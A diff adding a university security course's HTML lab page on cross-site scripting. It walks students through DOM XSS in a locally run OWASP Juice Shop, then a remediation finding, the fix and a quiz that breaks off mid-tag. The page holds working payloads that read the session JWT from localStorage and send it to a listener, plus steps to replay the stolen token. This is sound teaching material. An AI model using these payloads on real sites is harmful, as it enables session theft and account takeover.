@@ -1,0 +1,569 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Lab 04: Cross-Site Scripting (XSS) — CCY4202</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700;800&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="../assets/css/base.css" />
+  <link rel="stylesheet" href="../assets/css/layout.css" />
+  <link rel="stylesheet" href="../assets/css/components.css" />
+</head>
+<body data-nav-active="labs" data-active-lab="lab04" data-projector-qr>
+  <div data-site-nav></div>
+
+  <div class="page-wrapper">
+    <aside class="sidebar" id="site-sidebar">
+      <div class="sidebar__header">
+        <div class="sidebar__title">Course Modules</div>
+      </div>
+      <div id="sidebar-module-tree"></div>
+    </aside>
+    <div class="sidebar-backdrop"></div>
+
+    <main class="main-content">
+      <nav class="breadcrumbs" aria-label="Breadcrumb">
+        <a href="../index.html">Home</a>
+        <span class="breadcrumbs__separator">/</span>
+        <a href="../index.html">Labs</a>
+        <span class="breadcrumbs__separator">/</span>
+        <span>Module 01</span>
+        <span class="breadcrumbs__separator">/</span>
+        <span>Lab 04</span>
+      </nav>
+
+      <header class="lab-header">
+        <div class="lab-header__meta">
+          <span class="lab-badge lab-badge--time">⏱️ 60 Mins</span>
+          <span class="lab-badge lab-badge--difficulty">Intermediate</span>
+        </div>
+        <h1 class="lab-header__title">Lab 04: Cross-Site Scripting (XSS)</h1>
+        <p class="lab-header__lead">
+          Last week you made the database talk. This week you make the browser talk. You'll get your own JavaScript to run on a page the victim trusts, and once your code runs in their browser, their logged-in session is yours.
+        </p>
+      </header>
+
+      <!-- Career band (v2): where this sits in the real world -->
+      <div class="info-dense-card info-dense-card--accent" style="margin-bottom:var(--space-4);">
+        <div class="info-dense-card__title">📌 Where this lands in the real world</div>
+        <div class="info-dense-card__grid">
+          <div class="info-dense-card__cell">
+            <span class="info-dense-card__label">OWASP Top 10</span>
+            <code>A05: Injection (XSS)</code>
+          </div>
+          <div class="info-dense-card__cell">
+            <span class="info-dense-card__label">MITRE ATT&amp;CK</span>
+            <code>T1539</code>
+          </div>
+          <div class="info-dense-card__cell">
+            <span class="info-dense-card__label">CEH domain</span>
+            <code>Web App Hacking</code>
+          </div>
+          <div class="info-dense-card__cell">
+            <span class="info-dense-card__label">Builds toward</span>
+            <code>eJPT · BSCP</code>
+          </div>
+        </div>
+      </div>
+
+      <!-- Section 0: where we are -->
+      <section>
+        <h2 id="where-we-are">0. Where We Are</h2>
+        <div class="callout callout--theory">
+          <span class="callout__icon">🧭</span>
+          <div class="callout__content">
+            <div class="callout__title">Still Phase 3, still the same five steps</div>
+            <p style="margin:0;">
+              Same spine as last lab: Recon → Map → <strong>Identify → Exploit → Document</strong>. Last week the target was the server's database. This week the target moves to the <em>other</em> side of the request, the browser of whoever uses the app.
+            </p>
+          </div>
+        </div>
+      </section>
+
+      <!-- Section 1: what XSS is + why it matters + where the session lives -->
+      <section>
+        <h2 id="what-xss-is">1. What XSS Really Is <span style="font-size:var(--font-size-xs);color:var(--color-text-muted);font-family:var(--font-mono);">· foundation</span></h2>
+
+        <!-- Real-world anchor: the Samy worm -->
+        <div class="callout callout--tip">
+          <span class="callout__icon">🪱</span>
+          <div class="callout__content">
+            <div class="callout__title">October 2005: one profile takes down MySpace</div>
+            <p style="margin:0 0 var(--space-2);">
+              Samy Kamkar put a little JavaScript on his MySpace profile. When anyone viewed it, the script ran in <em>their</em> browser, added Samy as their friend, stuck "but most of all, samy is my hero" on their page, and copied itself onto their profile. Now their profile infected the next visitor. It hit over a million accounts in under 20 hours and MySpace had to pull the site offline.
+            </p>
+            <p style="margin:0;font-size:var(--font-size-sm);color:var(--color-text-secondary);">
+              He didn't break into a server. He just got his code to run in other people's browsers on a page they trusted. That's the whole idea of XSS, and it still runs the modern web's worst days.
+            </p>
+          </div>
+        </div>
+
+        <p class="lab-lead" style="margin-top:var(--space-4);">
+          What you see on screen is the <strong>DOM</strong>: the browser takes the HTML text the server sends, parses it into a live tree of elements, and runs any script attached to them. Here's the catch. It can't tell apart JavaScript the developer wrote from JavaScript you smuggled into a comment box. So the whole game is whether your text lands in that tree as <strong>words</strong> (just sits there) or as <strong>code</strong> (yours, and it runs).
+        </p>
+
+        <!-- Artifact-first: same full payload, escaped vs not, with the outcome shown -->
+        <div class="diagram-card" style="margin-top:var(--space-3);">
+          <div class="diagram-card__title"><span>SAME INPUT, TWO OUTCOMES</span></div>
+          <div class="comparison-grid" style="margin:0;">
+            <div class="comparison-card comparison-card--cyan">
+              <div class="comparison-card__header">
+                <h3 class="comparison-card__title">App escapes it → words</h3>
+                <span class="comparison-badge" style="color:var(--color-cyan);">safe</span>
+              </div>
+              <div class="terminal-window" style="margin:var(--space-2) 0 0;">
+                <div class="terminal-window__body"><pre><code>you type:   &lt;img src=x onerror=alert(1)&gt;
+page shows: &lt;img src=x onerror=alert(1)&gt;</code></pre></div>
+              </div>
+              <ul class="comparison-list" style="margin-top:var(--space-2);">
+                <li><span class="comparison-icon">🔒</span> It lands as plain text. The browser prints the characters and nothing runs.</li>
+              </ul>
+            </div>
+            <div class="comparison-card comparison-card--accent">
+              <div class="comparison-card__header">
+                <h3 class="comparison-card__title">App doesn't → code</h3>
+                <span class="comparison-badge" style="color:var(--color-accent);">XSS</span>
+              </div>
+              <div class="terminal-window" style="margin:var(--space-2) 0 0;">
+                <div class="terminal-window__body"><pre><code>you type:     &lt;img src=x onerror=alert(1)&gt;
+browser runs: alert(1)   🔔</code></pre></div>
+              </div>
+              <ul class="comparison-list" style="margin-top:var(--space-2);">
+                <li><span class="comparison-icon">💥</span> It lands as a real element. The broken image fires its <code>onerror</code>, and your code runs.</li>
+              </ul>
+            </div>
+          </div>
+          <p style="font-size:var(--font-size-xs);color:var(--color-text-muted);margin:var(--space-2) 0 0;">
+            Same characters both times. The only thing that changed is whether the app escaped them before writing them into the page. That one choice is the entire bug.
+          </p>
+        </div>
+
+        <!-- Prediction prompt before the session reveal -->
+        <div class="prediction-prompt" style="margin-top:var(--space-4);">
+          <div class="prediction-prompt__question">🤔 Say your JavaScript is now running on a page where the victim is logged in. You get one grab. What do you take, and where is it kept so your script can reach it?</div>
+          <div class="prediction-prompt__input-group">
+            <input type="text" class="prediction-prompt__input" placeholder="Your guess…" />
+            <button type="button" class="prediction-prompt__btn">Reveal</button>
+          </div>
+          <div class="prediction-prompt__reveal" hidden>
+            <span class="prediction-prompt__reveal-label">Answer</span>
+            <p style="margin:0;"><strong>The session.</strong> Once you're logged into Juice Shop, the server hands back a token (a JWT) that proves who you are. Steal that token and you don't need the password, you <em>are</em> that user. The catch is where the token sits, because that decides whether your script can read it.</p>
+          </div>
+        </div>
+
+        <!-- Where the session lives: verified fact, cookie vs localStorage -->
+        <h3 style="margin-top:var(--space-4);">Where Juice Shop keeps your session</h3>
+        <p class="lab-lead">
+          Log in, then open DevTools and look. The token shows up in <strong>localStorage</strong>, and any JavaScript on the page can read it:
+        </p>
+        <div class="terminal-window" style="margin:0 0 var(--space-3);">
+          <div class="terminal-window__header">
+            <span class="terminal-window__title">DevTools Console · logged into Juice Shop</span>
+          </div>
+          <div class="terminal-window__body"><pre><code>&gt; localStorage.getItem('token')
+"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9…"   // your whole session, in plain reach
+
+&gt; document.cookie
+"language=en"                             // the session isn't even in here</code></pre></div>
+        </div>
+
+        <div class="comparison-grid" style="margin:0;">
+          <div class="comparison-card comparison-card--cyan">
+            <div class="comparison-card__header">
+              <h3 class="comparison-card__title">A cookie can hide from JS</h3>
+              <span class="comparison-badge" style="color:var(--color-cyan);">HttpOnly</span>
+            </div>
+            <ul class="comparison-list">
+              <li><span class="comparison-icon">🍪</span> A session cookie marked <code>HttpOnly</code> is invisible to JavaScript, so XSS can't read it out and replay it elsewhere. It can still act as you inside the page, but it can't walk off with the cookie.</li>
+            </ul>
+          </div>
+          <div class="comparison-card comparison-card--accent">
+            <div class="comparison-card__header">
+              <h3 class="comparison-card__title">localStorage can't</h3>
+              <span class="comparison-badge" style="color:var(--color-accent);">no such flag</span>
+            </div>
+            <ul class="comparison-list">
+              <li><span class="comparison-icon">📖</span> There is no HttpOnly for localStorage. A token kept there is readable by any script on the origin, full stop. Juice Shop does exactly this, so XSS means instant session theft.</li>
+            </ul>
+          </div>
+        </div>
+
+        <details class="thought-accordion" style="margin-top:var(--space-3);">
+          <summary>"Isn't localStorage the modern, better way to store a token?"</summary>
+          <div class="thought-accordion__content">
+            <p style="margin:0;">It's common, and it dodges one class of attack (CSRF). But it trades that for this one: anything XSS can run can read it. The honest answer the industry lands on is that if you have XSS, you've mostly lost either way, so the real fix is not shipping XSS in the first place. That's the rest of this lab.</p>
+          </div>
+        </details>
+      </section>
+
+      <!-- Section 2: the three flavors of XSS -->
+      <section>
+        <h2 id="three-flavors">2. Three Flavors of XSS</h2>
+        <p class="lab-lead">
+          Same bug every time (your code runs on a trusted page), but it gets delivered three different ways. The only difference is where the payload lives and who ends up running it.
+        </p>
+        <div class="comparison-grid" style="margin:0;">
+          <div class="comparison-card comparison-card--cyan">
+            <div class="comparison-card__header">
+              <h3 class="comparison-card__title">Reflected</h3>
+              <span class="comparison-badge" style="color:var(--color-cyan);">needs a lure</span>
+            </div>
+            <ul class="comparison-list">
+              <li><span class="comparison-icon">🎣</span> Payload rides in a link or form. The server bounces it straight back into the page.</li>
+              <li><span class="comparison-icon">👤</span> Only hits whoever clicks your crafted link. One victim at a time.</li>
+            </ul>
+          </div>
+          <div class="comparison-card comparison-card--accent">
+            <div class="comparison-card__header">
+              <h3 class="comparison-card__title">Stored</h3>
+              <span class="comparison-badge" style="color:var(--color-accent);">the worst one</span>
+            </div>
+            <ul class="comparison-list">
+              <li><span class="comparison-icon">💾</span> Payload is saved on the server (a comment, a profile, a review).</li>
+              <li><span class="comparison-icon">👥</span> Runs for every visitor, no link needed. This is the Samy worm.</li>
+            </ul>
+          </div>
+          <div class="comparison-card comparison-card--cyan">
+            <div class="comparison-card__header">
+              <h3 class="comparison-card__title">DOM</h3>
+              <span class="comparison-badge" style="color:var(--color-cyan);">client-side only</span>
+            </div>
+            <ul class="comparison-list">
+              <li><span class="comparison-icon">🖥️</span> The page's own JavaScript takes something from the URL and writes it to the page.</li>
+              <li><span class="comparison-icon">🕳️</span> The payload may never touch the server. That's the one you'll land first.</li>
+            </ul>
+          </div>
+        </div>
+      </section>
+
+      <!-- Section 3: DOM XSS live on Juice Shop (verified) -->
+      <section>
+        <h2 id="dom-xss-live">3. Land Your First XSS, Live <span style="font-size:var(--font-size-xs);color:var(--color-text-muted);font-family:var(--font-mono);">· identify · exploit</span></h2>
+        <p class="lab-lead">
+          Juice Shop's search box takes whatever you type and writes it into the results heading <strong>as HTML</strong>, not as text. So anything you type becomes part of the page. Let's prove it.
+        </p>
+
+        <div class="target-launcher" data-target-slug="juice-shop">
+          <div class="target-launcher__header">
+            <div class="target-launcher__title-group">
+              <span class="target-launcher__icon">🧃</span>
+              <div>
+                <h3 class="target-launcher__title">OWASP Juice Shop</h3>
+                <div class="target-launcher__platform">Same container as Lab 02 and 03. If it's still running, skip the start step.</div>
+              </div>
+            </div>
+            <span class="target-launcher__badge">🎯 Launch Target</span>
+          </div>
+          <div class="target-launcher__body">
+            <div class="target-launcher__step">
+              <span class="target-launcher__step-label">🖐️ DO #1 · Start it (skip if it's still up)</span>
+              <div class="terminal-window" style="margin:var(--space-1) 0 0;">
+                <div class="terminal-window__header"><span class="terminal-window__title">bash · start Juice Shop</span></div>
+                <div class="terminal-window__body"><pre><code>docker run --rm -d --name juice -p 3000:3000 bkimminich/juice-shop</code></pre></div>
+              </div>
+            </div>
+            <div class="target-launcher__step">
+              <span class="target-launcher__step-label">Open it in the browser</span>
+              <a class="target-launcher__url" href="http://localhost:3000" target="_blank" rel="noopener">http://localhost:3000</a>
+            </div>
+          </div>
+          <div class="target-launcher__footer">
+            <span>Image <code>bkimminich/juice-shop</code> · runs offline once pulled</span>
+            <a class="target-launcher__catalog-link" href="../tools.html#juice-shop">→ setup card</a>
+          </div>
+        </div>
+
+        <div class="prediction-prompt" style="margin-top:var(--space-4);">
+          <div class="prediction-prompt__question">🤔 You're about to type <code>&lt;img src=x onerror=alert(document.domain)&gt;</code> into the search box. The image source <code>x</code> doesn't exist. So what happens? Write your guess first.</div>
+          <div class="prediction-prompt__input-group">
+            <input type="text" class="prediction-prompt__input" placeholder="Your guess…" />
+            <button type="button" class="prediction-prompt__btn">Reveal</button>
+          </div>
+          <div class="prediction-prompt__reveal" hidden>
+            <span class="prediction-prompt__reveal-label">Answer</span>
+            <p style="margin:0;">The page builds a real <code>&lt;img&gt;</code> element from your text. The browser tries to load <code>x</code>, fails, and fires the <code>onerror</code> handler you attached. Your JavaScript runs. The "broken image" is the whole point, it's just a reliable way to make your code fire.</p>
+          </div>
+        </div>
+
+        <div class="comparison-card comparison-card--cyan" style="margin-top:var(--space-4);">
+          <div class="comparison-card__header">
+            <h3 class="comparison-card__title">🟢 Baseline · everyone gets this</h3>
+          </div>
+          <ol style="font-size:var(--font-size-sm);color:var(--color-text-secondary);padding-left:var(--space-4);margin:var(--space-2) 0 0;display:flex;flex-direction:column;gap:var(--space-1);">
+            <li>Click the search icon (top bar) so the search box opens.</li>
+            <li>Type exactly: <code>&lt;img src=x onerror=alert(document.domain)&gt;</code></li>
+            <li>Press Enter. A popup fires showing <code>localhost</code>. That popup is your code running on their page.</li>
+          </ol>
+        </div>
+
+        <details class="thought-accordion" style="margin-top:var(--space-3);">
+          <summary>Nothing popped?</summary>
+          <div class="thought-accordion__content">
+            <p style="margin:0 0 var(--space-2);">Press <kbd>F12</kbd> → <strong>Elements</strong> and search the page for <code>searchValue</code>. If your <code>&lt;img&gt;</code> shows up there as a real element (not as grey text), the injection landed and the <code>onerror</code> should have fired. If it shows as plain text, you're on a build that escapes it, try the search route directly: <code>http://localhost:3000/#/search?q=&lt;img src=x onerror=alert(1)&gt;</code>.</p>
+            <p style="margin:0;">Some browsers block repeat alerts. Reload and fire it once.</p>
+          </div>
+        </details>
+
+        <div class="callout callout--tip" style="margin-top:var(--space-3);">
+          <span class="callout__icon">🖥️</span>
+          <div class="callout__content">
+            <div class="callout__title">Why this one is "DOM" XSS</div>
+            <p style="margin:0;">Remember from Lab 03: the server's search API gets an empty <code>q</code>. Your payload never reaches the backend. It's the page's own JavaScript that reads your text and writes it into the heading. The whole attack happens in the browser, which is exactly what makes it DOM-based.</p>
+          </div>
+        </div>
+      </section>
+
+      <!-- Section 4: weaponize - steal the session (verified) -->
+      <section>
+        <h2 id="steal-session">4. Make It Hurt: Steal the Session <span style="font-size:var(--font-size-xs);color:var(--color-text-muted);font-family:var(--font-mono);">· exploit</span></h2>
+        <p class="lab-lead">
+          A popup proves you can run code. Nobody pays for a popup. The real move is what your code does next, and from §1 you already know where the session lives: <code>localStorage</code>, in plain reach.
+        </p>
+
+        <div class="comparison-card comparison-card--accent" style="margin-top:var(--space-2);">
+          <div class="comparison-card__header">
+            <h3 class="comparison-card__title">🟡 Stretch · steal the session</h3>
+          </div>
+          <ol style="font-size:var(--font-size-sm);color:var(--color-text-secondary);padding-left:var(--space-4);margin:var(--space-2) 0 0;display:flex;flex-direction:column;gap:var(--space-2);">
+            <li>Log in first (any account, or the Lab 03 bypass) so there's a token to take.</li>
+            <li>You've already got both halves: the <code>&lt;img src=x onerror=...&gt;</code> shell from §3, and the one line that reads the token from §1. Fill the blank, then search it:
+              <div class="terminal-window" style="margin:var(--space-1) 0 0;"><div class="terminal-window__body"><pre><code>&lt;img src=x onerror="alert( ______ )"&gt;</code></pre></div></div>
+            </li>
+            <li>The popup shows the full JWT. Copy it. That string <em>is</em> the session.</li>
+            <li>Open a fresh <strong>Incognito</strong> window at <code>http://localhost:3000</code> (nobody logged in there). Open DevTools → Console and run:
+              <div class="terminal-window" style="margin:var(--space-1) 0 0;"><div class="terminal-window__body"><pre><code>localStorage.setItem('token', '&lt;PASTE_THE_JWT&gt;')</code></pre></div></div>
+            </li>
+            <li>Reload the page. You're logged in as that user. No password, no login form. That's the attack, start to finish.</li>
+          </ol>
+          <details class="thought-accordion" style="margin-top:var(--space-2);">
+            <summary>Stuck on the blank?</summary>
+            <div class="thought-accordion__content"><p style="margin:0;">It's the exact line from §1 that reads the token: <code>localStorage.getItem('token')</code>. So the full payload is <code>&lt;img src=x onerror="alert(localStorage.getItem('token'))"&gt;</code>.</p></div>
+          </details>
+        </div>
+
+        <div class="terminal-window" style="margin:var(--space-3) 0;">
+          <div class="terminal-window__header"><span class="terminal-window__title">what the popup shows · the victim's live session</span></div>
+          <div class="terminal-window__body"><pre><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ...   // their whole JWT, paste it anywhere to become them</code></pre></div>
+        </div>
+
+        <div class="comparison-card comparison-card--accent" style="margin-top:var(--space-2);">
+          <div class="comparison-card__header">
+            <h3 class="comparison-card__title">🔴 Going Pro · ship it off the machine</h3>
+          </div>
+          <p style="font-size:var(--font-size-sm);color:var(--color-text-secondary);margin:var(--space-2) 0;">
+            A popup only proves it to you. A real attacker sends the token somewhere they control, with no popup for the victim to notice. You can run this end to end right now: start a listener on your own machine, then fire the payload.
+          </p>
+          <div class="terminal-window" style="margin:0 0 var(--space-2);">
+            <div class="terminal-window__body"><pre><code># 1) your listener (your own machine, new terminal)
+python3 -m http.server 9000
+
+# 2) the payload, searched on Juice Shop
+&lt;img src=x onerror="new Image().src='http://localhost:9000/?c='+localStorage.getItem('token')"&gt;</code></pre></div>
+          </div>
+          <p style="font-size:var(--font-size-xs);color:var(--color-text-muted);margin:0;">
+            Watch your terminal. A <code>GET /?c=eyJ...</code> line appears with the token glued on, no popup, nothing for the victim to see. On a real engagement that listener is a box on the internet or Burp Collaborator, not localhost.
+          </p>
+        </div>
+
+        <details class="thought-accordion" style="margin-top:var(--space-3);">
+          <summary>Two things that make this worse than the textbook version</summary>
+          <div class="thought-accordion__content">
+            <p style="margin:0 0 var(--space-2);"><strong>No CSP.</strong> Juice Shop sends no <code>Content-Security-Policy</code> header (check it: <code>curl -I http://localhost:3000</code>). That's why your inline <code>onerror</code> ran at all. A strict CSP would block inline handlers, and getting past one is the pro skill you'll meet in the PortSwigger ladder and BSCP.</p>
+            <p style="margin:0;"><strong>HttpOnly can't save this.</strong> The one flag that hides a cookie from JavaScript does nothing here, because the token isn't in a cookie. It's in localStorage, which no flag protects. That's the real lesson: where you store a session decides what XSS can take.</p>
+          </div>
+        </details>
+      </section>
+
+      <!-- Section 5: reflected + stored depth on PortSwigger -->
+      <section>
+        <h2 id="portswigger-ladder">5. The Other Two Flavors, for Real <span style="font-size:var(--font-size-xs);color:var(--color-text-muted);font-family:var(--font-mono);">· exploit</span></h2>
+        <p class="lab-lead">
+          Juice Shop gave you DOM XSS. For clean, isolated reps on reflected and stored, PortSwigger's labs are built for exactly that: a fresh target each time, nothing else in the way.
+        </p>
+        <div class="target-launcher target-launcher--hosted" data-target-slug="portswigger">
+          <div class="target-launcher__header">
+            <div class="target-launcher__title-group">
+              <span class="target-launcher__icon">🎓</span>
+              <div>
+                <h3 class="target-launcher__title">PortSwigger: the XSS ladder</h3>
+                <div class="target-launcher__platform">Hosted · free account · do them in order</div>
+              </div>
+            </div>
+            <span class="target-launcher__badge">🌐 Go Deeper</span>
+          </div>
+          <div class="target-launcher__body">
+            <div class="target-launcher__step">
+              <span class="target-launcher__step-label">🖐️ DO #2 · Climb the ladder</span>
+              <a class="target-launcher__url" href="https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded" target="_blank" rel="noopener noreferrer">🟢 Reflected XSS into HTML context</a>
+              <a class="target-launcher__url" href="https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded" target="_blank" rel="noopener noreferrer" style="margin-top:6px;">🟡 Stored XSS into HTML context</a>
+              <a class="target-launcher__url" href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded" target="_blank" rel="noopener noreferrer" style="margin-top:6px;">🔴 XSS with angle brackets filtered (break out of an attribute)</a>
+            </div>
+          </div>
+          <div class="target-launcher__footer">
+            <span>Sign in at <code>portswigger.net</code> → <strong>Access the lab</strong> → fresh disposable URL</span>
+            <a class="target-launcher__catalog-link" href="../tools.html#portswigger">→ platform card</a>
+          </div>
+        </div>
+        <div class="prediction-prompt" style="margin-top:var(--space-3);">
+          <div class="prediction-prompt__question">🤔 In that 🔴 lab your input reflects <em>inside</em> an attribute, and angle brackets come back HTML-encoded, so you can't open a new tag:
+            <div class="terminal-window" style="margin:var(--space-1) 0 var(--space-1);"><div class="terminal-window__body"><pre><code>&lt;input type="text" value="YOUR_INPUT"&gt;</code></pre></div></div>
+            <code>&lt;img&gt;</code> and <code>&lt;svg&gt;</code> are off the table here. So how do you still get code to run? Guess before you climb.</div>
+          <div class="prediction-prompt__input-group">
+            <input type="text" class="prediction-prompt__input" placeholder="Your guess…" />
+            <button type="button" class="prediction-prompt__btn">Reveal</button>
+          </div>
+          <div class="prediction-prompt__reveal" hidden>
+            <span class="prediction-prompt__reveal-label">Answer</span>
+            <p style="margin:0;">You don't need a new tag. The double quote isn't encoded, so you close the <code>value="</code> and bolt your own event handler straight onto the input, something like <code>onmouseover</code> or <code>autofocus onfocus</code>. Working out the exact string is the lab. The move to keep: when you can't open a tag, break out of the attribute instead.</p>
+          </div>
+        </div>
+        <div class="callout callout--tip" style="margin-top:var(--space-3);">
+          <span class="callout__icon">🧠</span>
+          <div class="callout__content">
+            <div class="callout__title">Filter bypass is most of the real job</div>
+            <p style="margin:0;">When <code>&lt;script&gt;</code> is blocked you change shape: an event handler, a different tag, or breaking out of the attribute you landed in. The easy labs prove you understand XSS. This one proves you can still land it when the app fights back.</p>
+          </div>
+        </div>
+      </section>
+
+      <!-- Section 6: finding + fix -->
+      <section>
+        <h2 id="write-finding">6. Write the Finding <span style="font-size:var(--font-size-xs);color:var(--color-text-muted);font-family:var(--font-mono);">· document</span></h2>
+        <p class="lab-lead">
+          Same rule as last lab: the report is the deliverable. Turn today's XSS into one clean finding.
+        </p>
+        <div class="diagram-card">
+          <div class="diagram-card__title">
+            <span>📓 FINDING · Cross-Site Scripting in product search</span>
+            <span style="color:var(--color-danger);">severity: High</span>
+          </div>
+          <div class="table-container">
+            <table class="data-table">
+              <tbody>
+                <tr><td style="white-space:nowrap;"><strong>Title</strong></td><td>DOM-based XSS in the product search, enabling session token theft</td></tr>
+                <tr><td><strong>Severity</strong></td><td>High · <code>CVSS 7.1</code> (needs a user to open a crafted link; then full session takeover)</td></tr>
+                <tr><td><strong>Affected endpoint</strong></td><td>Client-side search sink, <code>/#/search?q=</code> (rendered into <code>#searchValue</code> as raw HTML)</td></tr>
+                <tr><td><strong>Steps to reproduce</strong></td><td>1. Search <code>&lt;img src=x onerror=alert(document.domain)&gt;</code> → script executes. 2. Swap in <code>&lt;img src=x onerror="alert(localStorage.getItem('token'))"&gt;</code> → the session JWT is readable by script and can be exfiltrated. 3. No CSP is present to block inline handlers.</td></tr>
+                <tr><td><strong>Impact</strong></td><td>Any user who opens a crafted search link runs attacker JavaScript in their session. The token lives in localStorage (no HttpOnly protection), so it can be stolen outright, leading to full account takeover.</td></tr>
+                <tr><td><strong>Remediation</strong></td><td>Encode output / let the framework escape it (don't call <code>bypassSecurityTrustHtml</code> on user input). Add a strict Content-Security-Policy. Keep session tokens in <code>HttpOnly</code> cookies, not localStorage.</td></tr>
+              </tbody>
+            </table>
+          </div>
+          <p style="font-size:var(--font-size-xs);color:var(--color-text-muted);margin:var(--space-2) 0 0;">CVSS is lower than last week's SQLi because XSS here needs a victim to click. "Reads the whole DB with no login" (9.8) beats "needs a click" (7.1). You'll score these properly in Week 13.</p>
+        </div>
+
+        <h3 id="the-fix" style="margin-top:var(--space-4);">The fix, side by side</h3>
+        <div class="comparison-grid" style="margin-top:var(--space-2);">
+          <div class="comparison-card comparison-card--accent">
+            <div class="comparison-card__header">
+              <h3 class="comparison-card__title">💥 Vulnerable</h3>
+              <span class="comparison-badge" style="color:var(--color-danger);border-color:rgba(255,51,102,0.4);">trust bypassed</span>
+            </div>
+            <div class="terminal-window" style="margin:0;">
+              <div class="terminal-window__body"><pre><code>// Angular normally escapes for you.
+// Juice Shop turns that OFF:
+this.searchValue =
+  this.sanitizer
+    .bypassSecurityTrustHtml(query);
+// raw user input, rendered as HTML</code></pre></div>
+            </div>
+          </div>
+          <div class="comparison-card comparison-card--cyan">
+            <div class="comparison-card__header">
+              <h3 class="comparison-card__title">✅ Fixed</h3>
+              <span class="comparison-badge" style="color:var(--color-cyan);border-color:rgba(0,229,255,0.4);">escaped</span>
+            </div>
+            <div class="terminal-window" style="margin:0;">
+              <div class="terminal-window__body"><pre><code>// Just let the framework do its job.
+this.searchValue = query;
+// bound with {{ }} / [textContent],
+// so &lt; and &gt; become harmless text</code></pre></div>
+            </div>
+          </div>
+        </div>
+        <p style="font-size:var(--font-size-sm);color:var(--color-text-secondary);margin-top:var(--space-2);">
+          The whole bug is one call that told the framework "trust this, don't escape it." Modern frameworks escape output by default. The fix is almost always to stop fighting them. Blacklisting the word <code>script</code> is not a fix, you saw in the 🔴 lab how many ways around that there are.
+        </p>
+      </section>
+
+      <!-- Section 7: quiz -->
+      <section>
+        <h2 id="self-assessment">Lab 04 Self-Assessment <span style="font-size:var(--font-size-xs);color:var(--color-text-muted);font-family:var(--font-mono);">· 6 questions</span></h2>
+        <p class="lab-lead">🖐️ DO #3 · Check yourself. Say why the wrong ones are wrong.</p>
+
+        <div class="quiz-card" data-question-id="lab04-q1">
+          <div class="quiz-question">Q1: What actually causes XSS?</div>
+          <div class="quiz-options">
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="Weak passwords are a different problem. XSS doesn't need to guess anything.">A) The user picked a weak password.</button>
+            <button type="button" class="quiz-option" data-correct="true" data-feedback="Right. The app put your input on the page as code instead of keeping it as text, so the browser ran it.">B) The app renders your input as code instead of keeping it as text.</button>
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="HTTPS encrypts the connection. It does nothing about a script the page itself chooses to run.">C) The site isn't using HTTPS.</button>
+          </div>
+          <div class="quiz-feedback"></div>
+        </div>
+
+        <div class="quiz-card" data-question-id="lab04-q2">
+          <div class="quiz-question">Q2: Which flavor of XSS runs for every visitor without anyone clicking a special link?</div>
+          <div class="quiz-options">
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="Reflected needs the victim to open your crafted link. One click, one victim.">A) Reflected</button>
+            <button type="button" class="quiz-option" data-correct="true" data-feedback="Correct. Stored sits on the server and runs for everyone who loads the page. That's how the Samy worm spread.">B) Stored</button>
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="DOM XSS still needs the victim to hit a URL carrying the payload.">C) DOM</button>
+          </div>
+          <div class="quiz-feedback"></div>
+        </div>
+
+        <div class="quiz-card" data-question-id="lab04-q3">
+          <div class="quiz-question">Q3: In Juice Shop, where does the session token live, and why does that matter for XSS?</div>
+          <div class="quiz-options">
+            <button type="button" class="quiz-option" data-correct="true" data-feedback="Right. localStorage has no HttpOnly equivalent, so any script on the page can read the token.">A) In localStorage, which any script on the page can read.</button>
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="It isn't in an HttpOnly cookie here. If it were, document.cookie couldn't read it. You checked: document.cookie only shows language=en.">B) In an HttpOnly cookie that JavaScript can't touch.</button>
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="The server holds its own copy, but the client keeps the token too, in localStorage, which is the part XSS steals.">C) Only on the server.</button>
+          </div>
+          <div class="quiz-feedback"></div>
+        </div>
+
+        <div class="quiz-card" data-question-id="lab04-q4">
+          <div class="quiz-question">Q4: What does the <code>HttpOnly</code> flag protect?</div>
+          <div class="quiz-options">
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="It doesn't touch localStorage at all. A token kept there is readable no matter what.">A) Anything stored in localStorage.</button>
+            <button type="button" class="quiz-option" data-correct="true" data-feedback="Correct. HttpOnly hides a cookie from document.cookie, so XSS can't read that cookie. It does nothing for localStorage.">B) A cookie, by hiding it from JavaScript.</button>
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="It's not about transport. That's HTTPS. HttpOnly is specifically about JavaScript access to a cookie.">C) The whole page, by forcing HTTPS.</button>
+          </div>
+          <div class="quiz-feedback"></div>
+        </div>
+
+        <div class="quiz-card" data-question-id="lab04-q5">
+          <div class="quiz-question">Q5: A developer wants to kill XSS for good. Best answer?</div>
+          <div class="quiz-options">
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="Blacklisting the word 'script' is trivially bypassed, you used onerror and svg in the 🔴 lab.">A) Block the word "script" in all inputs.</button>
+            <button type="button" class="quiz-option" data-correct="true" data-feedback="Right. Encode output / let the framework escape it, add a CSP, and keep tokens in HttpOnly cookies. Defense in depth, not a blacklist.">B) Encode output (let the framework escape), add a CSP, use HttpOnly cookies.</button>
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="Hiding the popup doesn't stop the script. The code still ran; you just didn't see the alert.">C) Disable alert() in the browser.</button>
+          </div>
+          <div class="quiz-feedback"></div>
+        </div>
+
+        <div class="quiz-card" data-question-id="lab04-q6"
+          data-expected-regex="&lt;\s*(img|svg|body|image)[^&gt;]*on\w+\s*=\s*[^&gt;]*alert"
